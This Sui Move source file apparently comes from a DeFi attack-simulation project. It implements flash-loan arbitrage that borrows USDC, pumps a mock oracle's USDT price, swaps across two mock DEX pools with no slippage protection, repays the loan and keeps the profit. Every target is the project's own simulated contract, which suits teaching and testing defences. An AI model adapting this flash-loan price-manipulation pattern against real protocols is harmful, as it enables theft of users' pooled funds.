// sources/attack_simulations/flash_loan_attack.move
module simulation::flash_loan_attack;

use simulation::coin_factory::{USDC, USDT};
use simulation::flash_loan_pool::{Self, FlashLoanPool};
use simulation::price_oracle::{Self, PriceOracle};
use simulation::simple_dex::{Self, Pool};
use sui::clock::Clock;
use sui::coin;
use sui::event;

// ============================================================================
// Structs
// ============================================================================

/// Flash loan attack executed event
public struct FlashLoanAttackExecuted has copy, drop {
    sender: address,
    borrowed_amount: u64,
    profit_amount: u64,
    initial_usdc: u64,
    final_usdc: u64,
}

// ============================================================================
// Public Functions
// ============================================================================

/// Execute arbitrage attack between pools using flash loan
/// This demonstrates a price manipulation attack using flash loans
/// Returns profit coin to caller for composability
public fun execute_arbitrage_attack(
    flash_pool: &mut FlashLoanPool<USDC>,
    dex_pool_1: &mut Pool<USDC, USDT>,
    dex_pool_2: &mut Pool<USDT, USDC>,
    oracle: &mut PriceOracle,
    clock: &Clock,
    loan_amount: u64,
    ctx: &mut TxContext,
): sui::coin::Coin<USDC> {
    let sender = tx_context::sender(ctx);

    // Step 1: Borrow USDC via flash loan
    let (borrowed_usdc, loan_receipt): (sui::coin::Coin<USDC>, flash_loan_pool::FlashLoan<USDC>) = flash_loan_pool::borrow_flash_loan(
        flash_pool,
        loan_amount,
        ctx,
    );

    let initial_usdc = coin::value(&borrowed_usdc);

    // Step 2: Manipulate oracle price (if needed for demonstration)
    let (original_price, _) = price_oracle::get_price<USDT>(oracle, clock);
    price_oracle::manipulate_price<USDT>(
        oracle,
        original_price * 110 / 100, // Pump USDT 10%
        clock,
        ctx,
    );

    // Step 3: Swap USDC → USDT in Pool 1
    let usdt_received = simple_dex::swap_a_to_b(
        dex_pool_1,
        borrowed_usdc,
        0, // No slippage protection for attack demonstration
        ctx,
    );

    // Step 4: Swap USDT → USDC in Pool 2 (arbitrage)
    let mut usdc_received = simple_dex::swap_a_to_b(
        dex_pool_2,
        usdt_received,
        0,
        ctx,
    );

    let final_usdc = coin::value(&usdc_received);

    // Step 5: Calculate profit
    let repayment_amount = loan_amount + ((loan_amount * 9) / 10000); // 0.09% fee
    let profit = if (final_usdc > repayment_amount) {
        final_usdc - repayment_amount
    } else {
        0
    };

    // Step 6: Repay flash loan
    let repayment = coin::split(&mut usdc_received, repayment_amount, ctx);
    flash_loan_pool::repay_flash_loan(flash_pool, repayment, loan_receipt, ctx);

    // Step 7: Restore oracle price (realistic attack might not do this)
    price_oracle::manipulate_price<USDT>(oracle, original_price, clock, ctx);

    // Emit attack event
    event::emit(FlashLoanAttackExecuted {
        sender,
        borrowed_amount: loan_amount,
        profit_amount: profit,
        initial_usdc,
        final_usdc,
    });

    // Return profit coin to caller
    usdc_received
}

/// Simpler version: Execute basic arbitrage without oracle manipulation
/// Returns profit coin to caller for composability
public fun execute_simple_arbitrage(
    flash_pool: &mut FlashLoanPool<USDC>,
    dex_pool_1: &mut Pool<USDC, USDT>,
    dex_pool_2: &mut Pool<USDT, USDC>,
    loan_amount: u64,
    ctx: &mut TxContext,
): sui::coin::Coin<USDC> {
    let sender = tx_context::sender(ctx);

    // Borrow USDC
    let (borrowed_usdc, loan_receipt) = flash_loan_pool::borrow_flash_loan(
        flash_pool,
        loan_amount,
        ctx,
    );

    // Swap USDC → USDT
    let usdt_received = simple_dex::swap_a_to_b(
        dex_pool_1,
        borrowed_usdc,
        0,
        ctx,
    );

    // Swap USDT → USDC (arbitrage)
    let mut usdc_received = simple_dex::swap_a_to_b(
        dex_pool_2,
        usdt_received,
        0,
        ctx,
    );

    // Repay loan
    let repayment_amount = loan_amount + ((loan_amount * 9) / 10000);
    let repayment = coin::split(&mut usdc_received, repayment_amount, ctx);
    flash_loan_pool::repay_flash_loan(flash_pool, repayment, loan_receipt, ctx);

    // Calculate profit
    let final_amount = coin::value(&usdc_received);
    let profit = if (final_amount > 0) { final_amount } else { 0 };

    event::emit(FlashLoanAttackExecuted {
        sender,
        borrowed_amount: loan_amount,
        profit_amount: profit,
        initial_usdc: loan_amount,
        final_usdc: final_amount,
    });

    // Return profit coin to caller
    usdc_received
}
